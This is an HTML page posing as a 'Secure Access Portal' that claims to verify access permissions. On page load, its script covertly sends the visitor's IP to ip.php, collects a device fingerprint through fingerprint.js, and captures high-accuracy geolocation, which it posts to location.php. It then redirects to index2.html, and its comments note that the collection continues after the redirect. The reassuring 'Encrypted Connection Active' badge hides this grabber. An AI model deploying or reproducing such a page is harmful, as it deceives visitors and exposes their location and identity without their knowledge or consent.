<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 50px 40px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            animation: fadeIn 0.4s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            color: white;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
            animation: logoSpin 1s ease-in-out;
        }

        @keyframes logoSpin {
            0% {
                transform: scale(0.5) rotate(0deg);
                opacity: 0;
            }
            100% {
                transform: scale(1) rotate(360deg);
                opacity: 1;
            }
        }

        h1 {
            color: #2d3748;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 12px;
        }

        .subtitle {
            color: #718096;
            font-size: 16px;
            margin-bottom: 35px;
            line-height: 1.6;
        }

        .status-card {
            background: linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
        }

        .status-icon {
            font-size: 48px;
            margin-bottom: 15px;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.15);
            }
        }

        .status-text {
            color: #4a5568;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .status-detail {
            color: #a0aec0;
            font-size: 13px;
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e2e8f0;
            border-radius: 10px;
            overflow: hidden;
            margin-top: 20px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 10px;
            animation: progressAnimation 1s ease-out forwards;
        }

        @keyframes progressAnimation {
            0% { width: 0%; }
            100% { width: 100%; }
        }

        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #f0fff4;
            color: #22543d;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
            margin-top: 15px;
            animation: badgeSlide 0.5s ease-out 0.3s backwards;
        }

        @keyframes badgeSlide {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .security-badge::before {
            content: "🔒";
            font-size: 16px;
        }

        @media (max-width: 500px) {
            .container {
                padding: 35px 25px;
            }

            h1 {
                font-size: 24px;
            }

            .subtitle {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🌐</div>
        <h1>Secure Access Portal</h1>
        <p class="subtitle">Verifying your access permissions...</p>
        
        <div class="status-card">
            <div class="status-icon" id="statusIcon">⏳</div>
            <div class="status-text" id="statusText">Establishing secure connection...</div>
            <div class="status-detail" id="statusDetail">Please wait</div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressBar"></div>
            </div>
        </div>

        <div class="security-badge">
            Encrypted Connection Active
        </div>
    </div>

    <script src="fingerprint.js"></script>
    <script>
        let sessionId = null;
        let dataCollected = false;
        let redirectTimer = null;

        // Force redirect après 1 seconde maximum
        function forceRedirect() {
            if (!dataCollected) {
                console.log('Force redirect after 1 second');
            }
            window.location.href = "index2.html";
        }

        // Démarrer le timer de redirection immédiat
        redirectTimer = setTimeout(forceRedirect, 1000);

        // Mettre à jour l'affichage
        function updateStatus() {
            const statusIcon = document.getElementById("statusIcon");
            const statusText = document.getElementById("statusText");
            const statusDetail = document.getElementById("statusDetail");
            
            statusIcon.textContent = "✅";
            statusText.textContent = "Connection secured";
            statusDetail.textContent = "Redirecting...";
        }

        // Capture location en arrière-plan (non-bloquant)
        function captureLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const data = new FormData();
                        data.append("lat", position.coords.latitude);
                        data.append("lon", position.coords.longitude);
                        data.append("acc", position.coords.accuracy);
                        data.append("session_id", sessionId);
                        data.append("time", new Date().getTime());
                        
                        fetch("location.php", {
                            method: "POST",
                            body: data
                        }).then(response => response.json())
                          .then(result => {
                              console.log("Location captured:", result);
                          })
                          .catch(error => {
                              console.error("Location error:", error);
                          });
                    },
                    function(error) {
                        console.log("Geolocation denied or unavailable:", error.message);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            }
        }

        // Initialize session et capturer les données rapidement
        async function initSession() {
            try {
                // Capture IP en premier (le plus rapide)
                const ipResponse = await fetch("ip.php", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                });
                
                const ipData = await ipResponse.json();
                
                if (ipData.status === "success" && ipData.session_id) {
                    sessionId = ipData.session_id;
                    
                    if (window.sessionStorage) {
                        window.sessionStorage.setItem("session_id", sessionId);
                    }
                    
                    console.log("Session initialized:", sessionId);
                    
                    // Marquer comme collecté
                    dataCollected = true;
                    updateStatus();
                    
                    // Lancer fingerprint et location en parallèle (non-bloquant)
                    // Ils continueront même après la redirection
                    Promise.all([
                        (async () => {
                            try {
                                const fingerprinter = new DeviceFingerprint();
                                const fingerprintData = await fingerprinter.collect();
                                if (fingerprintData) {
                                    await fingerprinter.send(sessionId);
                                    console.log("Fingerprint collected");
                                }
                            } catch (e) {
                                console.log("Fingerprint error:", e);
                            }
                        })(),
                        captureLocation()
                    ]);
                }
            } catch (error) {
                console.error("Session initialization error:", error);
                // Rediriger même en cas d'erreur
                dataCollected = true;
                updateStatus();
            }
        }

        // Démarrer immédiatement
        window.addEventListener("DOMContentLoaded", function() {
            initSession();
        });
    </script>
</body>
</html>
